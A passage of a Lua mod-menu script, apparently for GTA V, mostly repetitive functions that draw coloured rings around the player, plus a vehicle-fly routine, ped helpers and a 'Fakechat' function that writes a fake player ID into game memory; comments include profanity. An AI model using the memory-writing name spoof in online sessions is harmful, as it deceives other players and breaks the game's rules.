        GRAPHICS.DRAW_LINE(c.x + x1, c.y + y1, c.z - 0.95, c.x + x2, c.y + y2, c.z - 0.95, 255, 255, 0, 255)
    end
end
function hunhuan1(toggle)
    kongzhikk()
    kongzhika()
    kongzhikb()
    kongzhikc()
    kongzhikd()
end
function kongzhiak(toggle)
    local radius = 0.7
    local numSegments = 100
    local segmentAngle = 360 / numSegments
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    for i = 1, numSegments do
        local angle1 = math.rad((i - 1) * segmentAngle)
        local angle2 = math.rad(i * segmentAngle)
        local x1 = radius * math.cos(angle1)
        local y1 = radius * math.sin(angle1)
        local x2 = radius * math.cos(angle2)
        local y2 = radius * math.sin(angle2)
        GRAPHICS.DRAW_LINE(c.x + x1, c.y + y1, c.z - 0.90, c.x + x2, c.y + y2, c.z - 0.90, 150, 50, 200, 255)
    end
end
function kongzhiba(toggle)
    local radius = 0.71
    local numSegments = 100
    local segmentAngle = 360 / numSegments
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    for i = 1, numSegments do
        local angle1 = math.rad((i - 1) * segmentAngle)
        local angle2 = math.rad(i * segmentAngle)
        local x1 = radius * math.cos(angle1)
        local y1 = radius * math.sin(angle1)
        local x2 = radius * math.cos(angle2)
        local y2 = radius * math.sin(angle2)
        GRAPHICS.DRAW_LINE(c.x + x1, c.y + y1, c.z - 0.90, c.x + x2, c.y + y2, c.z - 0.90, 150, 50, 200, 255)
    end
end
function kongzhicb(toggle)
    local radius = 0.72
    local numSegments = 100
    local segmentAngle = 360 / numSegments
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    for i = 1, numSegments do
        local angle1 = math.rad((i - 1) * segmentAngle)
        local angle2 = math.rad(i * segmentAngle)
        local x1 = radius * math.cos(angle1)
        local y1 = radius * math.sin(angle1)
        local x2 = radius * math.cos(angle2)
        local y2 = radius * math.sin(angle2)
        GRAPHICS.DRAW_LINE(c.x + x1, c.y + y1, c.z - 0.90, c.x + x2, c.y + y2, c.z - 0.90, 150, 50, 200, 255)
    end
end
function kongzhidc(toggle)
    local radius = 0.73
    local numSegments = 100
    local segmentAngle = 360 / numSegments
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    for i = 1, numSegments do
        local angle1 = math.rad((i - 1) * segmentAngle)
        local angle2 = math.rad(i * segmentAngle)
        local x1 = radius * math.cos(angle1)
        local y1 = radius * math.sin(angle1)
        local x2 = radius * math.cos(angle2)
        local y2 = radius * math.sin(angle2)
        GRAPHICS.DRAW_LINE(c.x + x1, c.y + y1, c.z - 0.90, c.x + x2, c.y + y2, c.z - 0.90, 150, 50, 200, 255)
    end
end
function kongzhied(toggle)
    local radius = 0.74
    local numSegments = 100
    local segmentAngle = 360 / numSegments
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    for i = 1, numSegments do
        local angle1 = math.rad((i - 1) * segmentAngle)
        local angle2 = math.rad(i * segmentAngle)
        local x1 = radius * math.cos(angle1)
        local y1 = radius * math.sin(angle1)
        local x2 = radius * math.cos(angle2)
        local y2 = radius * math.sin(angle2)
        GRAPHICS.DRAW_LINE(c.x + x1, c.y + y1, c.z - 0.90, c.x + x2, c.y + y2, c.z - 0.90, 150, 50, 200, 255)
    end
end
function hunhuan2(toggle)
    kongzhiak()
    kongzhiba()
    kongzhicb()
    kongzhidc()
    kongzhied()
end
function kongzhiaa(toggle)
    local radius = 0.9
    local numSegments = 100
    local segmentAngle = 360 / numSegments
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    for i = 1, numSegments do
        local angle1 = math.rad((i - 1) * segmentAngle)
        local angle2 = math.rad(i * segmentAngle)
        local x1 = radius * math.cos(angle1)
        local y1 = radius * math.sin(angle1)
        local x2 = radius * math.cos(angle2)
        local y2 = radius * math.sin(angle2)
        GRAPHICS.DRAW_LINE(c.x + x1, c.y + y1, c.z - 0.8, c.x + x2, c.y + y2, c.z - 0.8, 0, 0, 0, 255)
    end
end
function kongzhibb(toggle)
    local radius = 0.91
    local numSegments = 100
    local segmentAngle = 360 / numSegments
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    for i = 1, numSegments do
        local angle1 = math.rad((i - 1) * segmentAngle)
        local angle2 = math.rad(i * segmentAngle)
        local x1 = radius * math.cos(angle1)
        local y1 = radius * math.sin(angle1)
        local x2 = radius * math.cos(angle2)
        local y2 = radius * math.sin(angle2)
        GRAPHICS.DRAW_LINE(c.x + x1, c.y + y1, c.z - 0.8, c.x + x2, c.y + y2, c.z - 0.8, 0, 0, 0, 255)
    end
end
function kongzhicc(toggle)
    local radius = 0.92
    local numSegments = 100
    local segmentAngle = 360 / numSegments
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    for i = 1, numSegments do
        local angle1 = math.rad((i - 1) * segmentAngle)
        local angle2 = math.rad(i * segmentAngle)
        local x1 = radius * math.cos(angle1)
        local y1 = radius * math.sin(angle1)
        local x2 = radius * math.cos(angle2)
        local y2 = radius * math.sin(angle2)
        GRAPHICS.DRAW_LINE(c.x + x1, c.y + y1, c.z - 0.8, c.x + x2, c.y + y2, c.z - 0.8, 0, 0, 0, 255)
    end
end
function kongzhidd(toggle)
    local radius = 0.93
    local numSegments = 100
    local segmentAngle = 360 / numSegments
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    for i = 1, numSegments do
        local angle1 = math.rad((i - 1) * segmentAngle)
        local angle2 = math.rad(i * segmentAngle)
        local x1 = radius * math.cos(angle1)
        local y1 = radius * math.sin(angle1)
        local x2 = radius * math.cos(angle2)
        local y2 = radius * math.sin(angle2)
        GRAPHICS.DRAW_LINE(c.x + x1, c.y + y1, c.z - 0.8, c.x + x2, c.y + y2, c.z - 0.8, 0, 0, 0, 255)
    end
end
function kongzhiee(toggle)
    local radius = 0.94
    local numSegments = 100
    local segmentAngle = 360 / numSegments
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    for i = 1, numSegments do
        local angle1 = math.rad((i - 1) * segmentAngle)
        local angle2 = math.rad(i * segmentAngle)
        local x1 = radius * math.cos(angle1)
        local y1 = radius * math.sin(angle1)
        local x2 = radius * math.cos(angle2)
        local y2 = radius * math.sin(angle2)
        GRAPHICS.DRAW_LINE(c.x + x1, c.y + y1, c.z - 0.8, c.x + x2, c.y + y2, c.z - 0.8, 0, 0, 0, 255)
    end
end
function hunhuan3(toggle)
    kongzhiaa()
    kongzhibb()
    kongzhicc()
    kongzhidd()
    kongzhiee()
end
function honga(toggle)
    local radius = 1.2
    local numSegments = 100
    local segmentAngle = 360 / numSegments
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    for i = 1, numSegments do
        local angle1 = math.rad((i - 1) * segmentAngle)
        local angle2 = math.rad(i * segmentAngle)
        local x1 = radius * math.cos(angle1)
        local y1 = radius * math.sin(angle1)
        local x2 = radius * math.cos(angle2)
        local y2 = radius * math.sin(angle2)
        GRAPHICS.DRAW_LINE(c.x + x1, c.y + y1, c.z - 0.7, c.x + x2, c.y + y2, c.z - 0.7, 255, 0, 0, 255)
    end
end
function hongb(toggle)
    local radius = 1.21
    local numSegments = 100
    local segmentAngle = 360 / numSegments
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    for i = 1, numSegments do
        local angle1 = math.rad((i - 1) * segmentAngle)
        local angle2 = math.rad(i * segmentAngle)
        local x1 = radius * math.cos(angle1)
        local y1 = radius * math.sin(angle1)
        local x2 = radius * math.cos(angle2)
        local y2 = radius * math.sin(angle2)
        GRAPHICS.DRAW_LINE(c.x + x1, c.y + y1, c.z - 0.7, c.x + x2, c.y + y2, c.z - 0.7, 255, 0, 0, 255)
    end
end
function hongc(toggle)
    local radius = 1.22
    local numSegments = 100
    local segmentAngle = 360 / numSegments
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    for i = 1, numSegments do
        local angle1 = math.rad((i - 1) * segmentAngle)
        local angle2 = math.rad(i * segmentAngle)
        local x1 = radius * math.cos(angle1)
        local y1 = radius * math.sin(angle1)
        local x2 = radius * math.cos(angle2)
        local y2 = radius * math.sin(angle2)
        GRAPHICS.DRAW_LINE(c.x + x1, c.y + y1, c.z - 0.7, c.x + x2, c.y + y2, c.z - 0.7, 255, 0, 0, 255)
    end
end
function hongd(toggle)
    local radius = 1.23
    local numSegments = 100
    local segmentAngle = 360 / numSegments
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    for i = 1, numSegments do
        local angle1 = math.rad((i - 1) * segmentAngle)
        local angle2 = math.rad(i * segmentAngle)
        local x1 = radius * math.cos(angle1)
        local y1 = radius * math.sin(angle1)
        local x2 = radius * math.cos(angle2)
        local y2 = radius * math.sin(angle2)
        GRAPHICS.DRAW_LINE(c.x + x1, c.y + y1, c.z - 0.7, c.x + x2, c.y + y2, c.z - 0.7, 255, 0, 0, 255)
    end
end
function honge(toggle)
    local radius = 1.24
    local numSegments = 100
    local segmentAngle = 360 / numSegments
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    for i = 1, numSegments do
        local angle1 = math.rad((i - 1) * segmentAngle)
        local angle2 = math.rad(i * segmentAngle)
        local x1 = radius * math.cos(angle1)
        local y1 = radius * math.sin(angle1)
        local x2 = radius * math.cos(angle2)
        local y2 = radius * math.sin(angle2)
        GRAPHICS.DRAW_LINE(c.x + x1, c.y + y1, c.z - 0.7, c.x + x2, c.y + y2, c.z - 0.7, 255, 0, 0, 255)
    end
end
function hunhuan4(toggle)
    honga()
    hongb()
    hongc()
    hongd()
    honge()
end
function hongaa(toggle)
    local radius = 1.5
    local numSegments = 100
    local segmentAngle = 360 / numSegments
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    for i = 1, numSegments do
        local angle1 = math.rad((i - 1) * segmentAngle)
        local angle2 = math.rad(i * segmentAngle)
        local x1 = radius * math.cos(angle1)
        local y1 = radius * math.sin(angle1)
        local x2 = radius * math.cos(angle2)
        local y2 = radius * math.sin(angle2)
        GRAPHICS.DRAW_LINE(c.x + x1, c.y + y1, c.z - 0.5, c.x + x2, c.y + y2, c.z - 0.5, 255, 0, 0, 255)
    end
end
function hongbb(toggle)
    local radius = 1.51
    local numSegments = 100
    local segmentAngle = 360 / numSegments
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    for i = 1, numSegments do
        local angle1 = math.rad((i - 1) * segmentAngle)
        local angle2 = math.rad(i * segmentAngle)
        local x1 = radius * math.cos(angle1)
        local y1 = radius * math.sin(angle1)
        local x2 = radius * math.cos(angle2)
        local y2 = radius * math.sin(angle2)
        GRAPHICS.DRAW_LINE(c.x + x1, c.y + y1, c.z - 0.5, c.x + x2, c.y + y2, c.z - 0.5, 255, 0, 0, 255)
    end
end
function hongcc(toggle)
    local radius = 1.52
    local numSegments = 100
    local segmentAngle = 360 / numSegments
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    for i = 1, numSegments do
        local angle1 = math.rad((i - 1) * segmentAngle)
        local angle2 = math.rad(i * segmentAngle)
        local x1 = radius * math.cos(angle1)
        local y1 = radius * math.sin(angle1)
        local x2 = radius * math.cos(angle2)
        local y2 = radius * math.sin(angle2)
        GRAPHICS.DRAW_LINE(c.x + x1, c.y + y1, c.z - 0.5, c.x + x2, c.y + y2, c.z - 0.5, 255, 0, 0, 255)
    end
end
function hongdd(toggle)
    local radius = 1.53
    local numSegments = 100
    local segmentAngle = 360 / numSegments
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    for i = 1, numSegments do
        local angle1 = math.rad((i - 1) * segmentAngle)
        local angle2 = math.rad(i * segmentAngle)
        local x1 = radius * math.cos(angle1)
        local y1 = radius * math.sin(angle1)
        local x2 = radius * math.cos(angle2)
        local y2 = radius * math.sin(angle2)
        GRAPHICS.DRAW_LINE(c.x + x1, c.y + y1, c.z - 0.5, c.x + x2, c.y + y2, c.z - 0.5, 255, 0, 0, 255)
    end
end
function hongee(toggle)
    local radius = 1.54
    local numSegments = 100
    local segmentAngle = 360 / numSegments
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    for i = 1, numSegments do
        local angle1 = math.rad((i - 1) * segmentAngle)
        local angle2 = math.rad(i * segmentAngle)
        local x1 = radius * math.cos(angle1)
        local y1 = radius * math.sin(angle1)
        local x2 = radius * math.cos(angle2)
        local y2 = radius * math.sin(angle2)
        GRAPHICS.DRAW_LINE(c.x + x1, c.y + y1, c.z - 0.5, c.x + x2, c.y + y2, c.z - 0.5, 255, 0, 0, 255)
    end
end
function hunhuan5(toggle)
    hongaa()
    hongbb()
    hongcc()
    hongdd()
    hongee()
end
function hongaaa(toggle)
    local radius = 1.7
    local numSegments = 100
    local segmentAngle = 360 / numSegments
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    for i = 1, numSegments do
        local angle1 = math.rad((i - 1) * segmentAngle)
        local angle2 = math.rad(i * segmentAngle)
        local x1 = radius * math.cos(angle1)
        local y1 = radius * math.sin(angle1)
        local x2 = radius * math.cos(angle2)
        local y2 = radius * math.sin(angle2)
        GRAPHICS.DRAW_LINE(c.x + x1, c.y + y1, c.z - 0.3, c.x + x2, c.y + y2, c.z - 0.3, 255, 0, 0, 255)
    end
end
function hongbbb(toggle)
    local radius = 1.71
    local numSegments = 100
    local segmentAngle = 360 / numSegments
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    for i = 1, numSegments do
        local angle1 = math.rad((i - 1) * segmentAngle)
        local angle2 = math.rad(i * segmentAngle)
        local x1 = radius * math.cos(angle1)
        local y1 = radius * math.sin(angle1)
        local x2 = radius * math.cos(angle2)
        local y2 = radius * math.sin(angle2)
        GRAPHICS.DRAW_LINE(c.x + x1, c.y + y1, c.z - 0.3, c.x + x2, c.y + y2, c.z - 0.3, 255, 0, 0, 255)
    end
end
function hongccc(toggle)
    local radius = 1.72
    local numSegments = 100
    local segmentAngle = 360 / numSegments
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    for i = 1, numSegments do
        local angle1 = math.rad((i - 1) * segmentAngle)
        local angle2 = math.rad(i * segmentAngle)
        local x1 = radius * math.cos(angle1)
        local y1 = radius * math.sin(angle1)
        local x2 = radius * math.cos(angle2)
        local y2 = radius * math.sin(angle2)
        GRAPHICS.DRAW_LINE(c.x + x1, c.y + y1, c.z - 0.3, c.x + x2, c.y + y2, c.z - 0.3, 255, 0, 0, 255)
    end
end
function hongddd(toggle)
    local radius = 1.73
    local numSegments = 100
    local segmentAngle = 360 / numSegments
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    for i = 1, numSegments do
        local angle1 = math.rad((i - 1) * segmentAngle)
        local angle2 = math.rad(i * segmentAngle)
        local x1 = radius * math.cos(angle1)
        local y1 = radius * math.sin(angle1)
        local x2 = radius * math.cos(angle2)
        local y2 = radius * math.sin(angle2)
        GRAPHICS.DRAW_LINE(c.x + x1, c.y + y1, c.z - 0.3, c.x + x2, c.y + y2, c.z - 0.3, 255, 0, 0, 255)
    end
end
function hongeee(toggle)
    local radius = 1.74
    local numSegments = 100
    local segmentAngle = 360 / numSegments
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    for i = 1, numSegments do
        local angle1 = math.rad((i - 1) * segmentAngle)
        local angle2 = math.rad(i * segmentAngle)
        local x1 = radius * math.cos(angle1)
        local y1 = radius * math.sin(angle1)
        local x2 = radius * math.cos(angle2)
        local y2 = radius * math.sin(angle2)
        GRAPHICS.DRAW_LINE(c.x + x1, c.y + y1, c.z - 0.3, c.x + x2, c.y + y2, c.z - 0.3, 255, 0, 0, 255)
    end
end
function hunhuan6(toggle)
    hongaaa()
    hongbbb()
    hongccc()
    hongddd()
    hongeee()
end
function hongaaaa(toggle)
    local radius = 1.9
    local numSegments = 100
    local segmentAngle = 360 / numSegments
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    for i = 1, numSegments do
        local angle1 = math.rad((i - 1) * segmentAngle)
        local angle2 = math.rad(i * segmentAngle)
        local x1 = radius * math.cos(angle1)
        local y1 = radius * math.sin(angle1)
        local x2 = radius * math.cos(angle2)
        local y2 = radius * math.sin(angle2)
        GRAPHICS.DRAW_LINE(c.x + x1, c.y + y1, c.z - 0.1, c.x + x2, c.y + y2, c.z - 0.1, 255, 0, 0, 255)
    end
end
function hongbbbb(toggle)
    local radius = 1.91
    local numSegments = 100
    local segmentAngle = 360 / numSegments
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    for i = 1, numSegments do
        local angle1 = math.rad((i - 1) * segmentAngle)
        local angle2 = math.rad(i * segmentAngle)
        local x1 = radius * math.cos(angle1)
        local y1 = radius * math.sin(angle1)
        local x2 = radius * math.cos(angle2)
        local y2 = radius * math.sin(angle2)
        GRAPHICS.DRAW_LINE(c.x + x1, c.y + y1, c.z - 0.1, c.x + x2, c.y + y2, c.z - 0.1, 255, 0, 0, 255)
    end
end
function hongcccc(toggle)
    local radius = 1.92
    local numSegments = 100
    local segmentAngle = 360 / numSegments
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    for i = 1, numSegments do
        local angle1 = math.rad((i - 1) * segmentAngle)
        local angle2 = math.rad(i * segmentAngle)
        local x1 = radius * math.cos(angle1)
        local y1 = radius * math.sin(angle1)
        local x2 = radius * math.cos(angle2)
        local y2 = radius * math.sin(angle2)
        GRAPHICS.DRAW_LINE(c.x + x1, c.y + y1, c.z - 0.1, c.x + x2, c.y + y2, c.z - 0.1, 255, 0, 0, 255)
    end
end
function hongdddd(toggle)
    local radius = 1.93
    local numSegments = 100
    local segmentAngle = 360 / numSegments
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    for i = 1, numSegments do
        local angle1 = math.rad((i - 1) * segmentAngle)
        local angle2 = math.rad(i * segmentAngle)
        local x1 = radius * math.cos(angle1)
        local y1 = radius * math.sin(angle1)
        local x2 = radius * math.cos(angle2)
        local y2 = radius * math.sin(angle2)
        GRAPHICS.DRAW_LINE(c.x + x1, c.y + y1, c.z - 0.1, c.x + x2, c.y + y2, c.z - 0.1, 255, 0, 0, 255)
    end
end
function hongeeee(toggle)
    local radius = 1.94
    local numSegments = 100
    local segmentAngle = 360 / numSegments
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    for i = 1, numSegments do
        local angle1 = math.rad((i - 1) * segmentAngle)
        local angle2 = math.rad(i * segmentAngle)
        local x1 = radius * math.cos(angle1)
        local y1 = radius * math.sin(angle1)
        local x2 = radius * math.cos(angle2)
        local y2 = radius * math.sin(angle2)
        GRAPHICS.DRAW_LINE(c.x + x1, c.y + y1, c.z - 0.1, c.x + x2, c.y + y2, c.z - 0.1, 255, 0, 0, 255)
    end
end
function hunhuan7(toggle)
    hongaaaa()
    hongbbbb()
    hongcccc()
    hongdddd()
    hongeeee()
end
function hongaaaaa(toggle)
    local radius = 2.2
    local numSegments = 100
    local segmentAngle = 360 / numSegments
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    for i = 1, numSegments do
        local angle1 = math.rad((i - 1) * segmentAngle)
        local angle2 = math.rad(i * segmentAngle)
        local x1 = radius * math.cos(angle1)
        local y1 = radius * math.sin(angle1)
        local x2 = radius * math.cos(angle2)
        local y2 = radius * math.sin(angle2)
        GRAPHICS.DRAW_LINE(c.x + x1, c.y + y1, c.z + 0.1, c.x + x2, c.y + y2, c.z + 0.1, 255, 0, 0, 255)
    end
end
function hongbbbbb(toggle)
    local radius = 2.21
    local numSegments = 100
    local segmentAngle = 360 / numSegments
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    for i = 1, numSegments do
        local angle1 = math.rad((i - 1) * segmentAngle)
        local angle2 = math.rad(i * segmentAngle)
        local x1 = radius * math.cos(angle1)
        local y1 = radius * math.sin(angle1)
        local x2 = radius * math.cos(angle2)
        local y2 = radius * math.sin(angle2)
        GRAPHICS.DRAW_LINE(c.x + x1, c.y + y1, c.z + 0.1, c.x + x2, c.y + y2, c.z + 0.1, 255, 0, 0, 255)
    end
end
function hongccccc(toggle)
    local radius = 2.22
    local numSegments = 100
    local segmentAngle = 360 / numSegments
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    for i = 1, numSegments do
        local angle1 = math.rad((i - 1) * segmentAngle)
        local angle2 = math.rad(i * segmentAngle)
        local x1 = radius * math.cos(angle1)
        local y1 = radius * math.sin(angle1)
        local x2 = radius * math.cos(angle2)
        local y2 = radius * math.sin(angle2)
        GRAPHICS.DRAW_LINE(c.x + x1, c.y + y1, c.z + 0.1, c.x + x2, c.y + y2, c.z + 0.1, 255, 0, 0, 255)
    end
end
function hongddddd(toggle)
    local radius = 2.23
    local numSegments = 100
    local segmentAngle = 360 / numSegments
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    for i = 1, numSegments do
        local angle1 = math.rad((i - 1) * segmentAngle)
        local angle2 = math.rad(i * segmentAngle)
        local x1 = radius * math.cos(angle1)
        local y1 = radius * math.sin(angle1)
        local x2 = radius * math.cos(angle2)
        local y2 = radius * math.sin(angle2)
        GRAPHICS.DRAW_LINE(c.x + x1, c.y + y1, c.z + 0.1, c.x + x2, c.y + y2, c.z + 0.1, 255, 0, 0, 255)
    end
end
function hongeeeee(toggle)
    local radius = 2.24
    local numSegments = 100
    local segmentAngle = 360 / numSegments
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    for i = 1, numSegments do
        local angle1 = math.rad((i - 1) * segmentAngle)
        local angle2 = math.rad(i * segmentAngle)
        local x1 = radius * math.cos(angle1)
        local y1 = radius * math.sin(angle1)
        local x2 = radius * math.cos(angle2)
        local y2 = radius * math.sin(angle2)
        GRAPHICS.DRAW_LINE(c.x + x1, c.y + y1, c.z + 0.1, c.x + x2, c.y + y2, c.z + 0.1, 255, 0, 0, 255)
    end
end
function hunhuan8(toggle)
    hongaaaaa()
    hongbbbbb()
    hongccccc()
    hongddddd()
    hongeeeee()
end
-- FUCK YOU
speed = 6
function do_vehicle_fly()
    veh = PED.GET_VEHICLE_PED_IS_IN(PLAYER.PLAYER_PED_ID(), false);
    cam_pos = CAM.GET_GAMEPLAY_CAM_ROT(0);
    ENTITY.SET_ENTITY_ROTATION(veh, cam_pos.x, cam_pos.y, cam_pos.z, 1, TRUE);
    ENTITY.SET_ENTITY_COLLISION(veh, not no_collision, TRUE);
    local locspeed = speed * 10
    local locspeed2 = speed
    if PAD.IS_CONTROL_PRESSED(0, 61) then
        locspeed = locspeed * 2
        locspeed2 = locspeed2 * 2
    end
    if PAD.IS_CONTROL_PRESSED(2, 71) then
        if dont_stop then
            ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, speed, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
        else
            VEHICLE.SET_VEHICLE_FORWARD_SPEED(veh, locspeed)
        end
    end
    if PAD.IS_CONTROL_PRESSED(2, 72) then
        local lsp = speed
        if not PAD.IS_CONTROL_PRESSED(0, 61) then
            lsp = speed * 2
        end
        if dont_stop then
            ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, 0 - (lsp), 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
        else
            VEHICLE.SET_VEHICLE_FORWARD_SPEED(veh, 0 - (locspeed));
        end
    end
    if PAD.IS_CONTROL_PRESSED(2, 63) then
        local lsp = (0 - speed) * 2
        if not PAD.IS_CONTROL_PRESSED(0, 61) then
            lsp = 0 - speed
        end
        if dont_stop then
            ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, (lsp), 0.0, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
        else
            ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0 - (locspeed), 0.0, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1);
        end
    end
    if PAD.IS_CONTROL_PRESSED(2, 64) then
        local lsp = speed
        if not PAD.IS_CONTROL_PRESSED(0, 61) then
            lsp = speed * 2
        end
        if dont_stop then
            ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, lsp, 0.0, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
        else
            ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, locspeed, 0.0, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
        end
    end
    if not dont_stop and not PAD.IS_CONTROL_PRESSED(2, 71) and not PAD.IS_CONTROL_PRESSED(2, 72) then
        VEHICLE.SET_VEHICLE_FORWARD_SPEED(veh, 0.0);
    end
end
function get_ped_weapon(ped)
    local weaponHash = 0
    if ENTITY.DOES_ENTITY_EXIST(ped) and ENTITY.IS_ENTITY_A_PED(ped) then
        local ptr = memory.alloc_int()
        if WEAPON.GET_CURRENT_PED_WEAPON(ped, ptr, true) then
            weaponHash = memory.read_int(ptr)
        end
    end
    return weaponHash
end
function get_weapon_name_by_hash(weaponHash)
    if WEAPON.IS_WEAPON_VALID(weaponHash) then
        for _, item in pairs(util.get_weapons()) do
            if item.hash == weaponHash then
                return util.get_label_text(item.label_key)
            end
        end
    end
    return ""
end
function is_player_ped_return(ped)
    return entities.is_player_ped(ped)
end
function is_friendly_ped_return(ped)
    if not ENTITY.IS_ENTITY_A_PED(ped) then
        return false
    end
    local rel = PED.GET_RELATIONSHIP_BETWEEN_PEDS(ped, players.user_ped())
    if rel == 0 or rel == 1 then 
        return true
    end
    return false
end
function is_hostile_ped_return(ped)
    if not ENTITY.IS_ENTITY_A_PED(ped) then
        return false
    end
    if PED.IS_PED_IN_COMBAT(ped, players.user_ped()) then
        return true
    end
    local rel = PED.GET_RELATIONSHIP_BETWEEN_PEDS(ped, players.user_ped())
    if rel == 3 or rel == 4 or rel == 5 then 
        return true
    end
    return false
end
function checkPed(ped, pedTypeSelect)
    if is_player_ped_return(ped) then
        return false
    end
    if pedTypeSelect == 1 and not is_friendly_ped_return(ped) then
        return true
    end
    if pedTypeSelect == 2 and is_hostile_ped_return(ped) then
        return true
    end
    if pedTypeSelect == 3 then
        return true
    end
    return false
end
function IS_SCRIPT_RUNNING(script)
    return SCRIPT.GET_NUMBER_OF_THREADS_RUNNING_THE_SCRIPT_WITH_THIS_HASH(util.joaat(script)) > 0
end
function LOCAL_SET_INT(script, script_local, value)
    if memory.script_local(script, script_local) ~= 0 then
        memory.write_int(memory.script_local(script, script_local), value)
    end
end
function inSession()
    if util.is_session_started() and not util.is_session_transition_active() then
        return true
    else
        return false
    end
end
function IS_HELP_MSG_DISPLAYED(label)
    BEGIN_TEXT_COMMAND_IS_THIS_HELP_MESSAGE_BEING_DISPLAYED(label)
    return END_TEXT_COMMAND_IS_THIS_HELP_MESSAGE_BEING_DISPLAYED(0)
end
--杂项
-- 原创功能 缝合死妈

function is_script(scriptName)
    return SCRIPT.GET_NUMBER_OF_THREADS_RUNNING_THE_SCRIPT_WITH_THIS_HASH(MISC.GET_HASH_KEY(scriptName))
end

function show_keyboard(text) 
    local time = os.clock() + 0.4;
    while os.clock() < time do
        util.yield()
    end
    MISC.DISPLAY_ONSCREEN_KEYBOARD(true, 
    ("FMMC_KEY_TIP8" == nil and "HUD_TITLE" or "FMMC_KEY_TIP8"), 
    "", (text == nil 
    and "" or text), "", "", "", 60)
    while MISC.UPDATE_ONSCREEN_KEYBOARD() == 0 do
        util.yield() 
    end
    if not MISC.GET_ONSCREEN_KEYBOARD_RESULT() then
        return ""
    else
        return MISC.GET_ONSCREEN_KEYBOARD_RESULT()
    end
end

function Fakechat()
    local ipid = show_keyboard("输入虚假ID :XiProNB");
    local edit = string.match(ipid, ":(.*)");
    if edit then
        if string.match(edit, "[\128-\191\200-\239][\128-\191]*") then
            util.toast("修改失败,不支持中文.")
        else
            memory.write_string(memory.scan("4d") + 0x2F27D8C, edit)
            util.toast("你已修改为: " .. edit)
        end
    else
        util.toast("已取消修改.")
    end
end
--雷霆之翼
function shanchushichao()
    local Allpeds = entities.get_all_peds_as_handles()
    for i = 1, #Allpeds do
        local ped = Allpeds[i]
        
        if not PED.IS_PED_A_PLAYER(ped) then
            TASK.CLEAR_PED_TASKS(ped)
            PED.RESET_PED_MOVEMENT_CLIPSET(ped, 0.3)
            PED.RESET_PED_STRAFE_CLIPSET(ped)
            PED.RESET_PED_WEAPON_MOVEMENT_CLIPSET(ped)
            PED.CLEAR_PED_BLOOD_DAMAGE(ped)
            PED.CLEAR_PED_WETNESS(ped)
            PED.CLEAR_PED_ENV_DIRT(ped)
            PED.RESET_PED_VISIBLE_DAMAGE(ped)
            for i = 0, 5 do
                PED.CLEAR_PED_DAMAGE_DECAL_BY_ZONE(ped, i, "ALL")
            end
            zombieTable[ped] = nil
        end
    end
end

function leiting(feat) -- 雷霆之翼
    obj_bool = feat
    local xrot = 90 
    local yrot = 0 
    local xpos = 0
    local xcpos = -0.2
    local zpos = 0
    local action_speed = 0.08
    if obj_bool then
        local self_p = players.user()
        local my_pos = players.get_position(self_p)
        if not obj then
            ball_ent = spawn_object(util.joaat("prop_bskball_01"), my_pos, 1)
            ball_ent1 = spawn_object(util.joaat("prop_bskball_01"), my_pos, 1)
            obj_ent = spawn_object(util.joaat("w_ar_railgun"), my_pos, 1)
            obj_ent1 = spawn_object(util.joaat("w_ar_railgun"), my_pos, 1)
            obj_ent2 = spawn_object(util.joaat("w_ar_railgun"), my_pos, 1)
            obj_ent3 = spawn_object(util.joaat("w_ar_railgun"), my_pos, 1)
            obj_ent4 = spawn_object(util.joaat("prop_cs_katana_01"), my_pos, 1)
            obj_ent5 = spawn_object(util.joaat("prop_cs_katana_01"), my_pos, 1)
            obj_ent6 = spawn_object(util.joaat("prop_cs_katana_01"), my_pos, 1)
            obj_ent7 = spawn_object(util.joaat("prop_cs_katana_01"), my_pos, 1)
